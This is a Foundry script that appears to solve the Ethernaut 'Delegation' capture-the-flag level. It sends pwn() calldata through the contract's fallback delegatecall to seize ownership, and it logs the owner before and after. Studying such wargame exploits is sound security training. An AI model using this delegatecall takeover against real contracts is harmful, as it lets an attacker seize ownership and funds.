// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import "../src/Delegation.sol";

contract DelegatSolution is Script {
    Delegation delegationInstance = Delegation (payable(<Contract_address>));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Before attack, Owner:", delegationInstance.owner());

        // pwn() calldata with low-level call
        bytes memory pwnCalldata = abi.encodeWithSignature("pwn()");
        (bool success, ) = address(delegationInstance).call(pwnCalldata);
        require(success, "Attack failed");

        console.log("After attack, Owner:", delegationInstance.owner());
        console.log("My Address:", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}